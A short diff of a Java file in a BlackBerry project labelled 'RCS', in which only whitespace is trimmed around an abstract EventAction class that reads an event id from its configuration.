@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action;
 
 import blackberry.Messages;
@@ -19,7 +19,7 @@ abstract class EventAction extends SubAction {
     //#ifdef DEBUG
     private static Debug debug = new Debug("EventAction", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
-    
+
     protected int eventId;
 
     public EventAction(ConfAction params) {
@@ -27,7 +27,7 @@ abstract class EventAction extends SubAction {
     }
 
     protected boolean parse(ConfAction params) {
-        try {            
+        try {
             this.eventId = params.getInt(Messages.getString("b.1")); //$NON-NLS-1$
 
         } catch (ConfigurationException e) {
